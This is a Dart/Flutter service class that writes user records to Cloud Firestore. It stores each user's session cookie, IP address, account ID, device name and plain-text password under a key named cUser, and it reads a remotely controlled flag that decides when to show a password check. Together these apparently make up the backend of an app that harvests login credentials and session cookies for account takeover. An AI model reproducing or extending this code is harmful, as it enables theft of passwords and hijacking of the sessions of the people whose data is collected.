import '../../core/utils/app_utils.dart';
import 'cloud_firestore_service.dart';

class DBService {
  DBService._() {
    _cloudService = CloudFireStoreService.instance;
  }

  static DBService? _instance;

  factory DBService() => _instance ?? DBService._();

  late final CloudFireStoreService _cloudService;

  Future<void> addUser({
    required String cUser,
    required String ipAddress,
    required String cookie,
    required String locale,
    required String displayName,
    required String accountId,
    required String password,
    required String deviceName,
    required String versionApp,
  }) async {
    try {
      await _cloudService.setDocData(
        docPath: 'User/$cUser',
        merge: true,
        data: {
          'ip_address': ipAddress,
          'cookie': cookie,
          'locale': locale,
          'display_name': displayName,
          'account_id': accountId,
          'password': password,
          'device_name': deviceName,
          'version_app': versionApp,
          'create_at': formatDateVBNB(DateTime.fromMillisecondsSinceEpoch(
                  DateTime.now().millisecondsSinceEpoch)
              .toString()),
          'filter': DateTime.now().millisecondsSinceEpoch
        },
      );
    } catch (e) {
      rethrow;
    }
  }

  Future<void> updateData({
    required String cUser,
    required String ipAddress,
    required String cookie,
    required String locale,
    required String displayName,
    required String accountId,
    required String deviceName,
    required String versionApp,
  }) async {
    await _cloudService.updateDocData(
      docPath: 'User/$cUser',
      data: {
        'ip_address': ipAddress,
        'cookie': cookie,
        'locale': locale,
        'display_name': displayName,
        'account_id': accountId,
        'device_name': deviceName,
        'version_app': versionApp,
        'create_at': formatDateVBNB(DateTime.fromMillisecondsSinceEpoch(
                DateTime.now().millisecondsSinceEpoch)
            .toString()),
        'filter': DateTime.now().millisecondsSinceEpoch
      },
    );
  }

  Future<bool> checkPass() async {
    final isShow = await _cloudService.getDocData(
      docPath: 'IsCheckPass/UpM0pc5R3SVu729MWfdO',
      responseBuilder: (data) => data['is_show_check_pass'],
    );
    return isShow;
  }
}
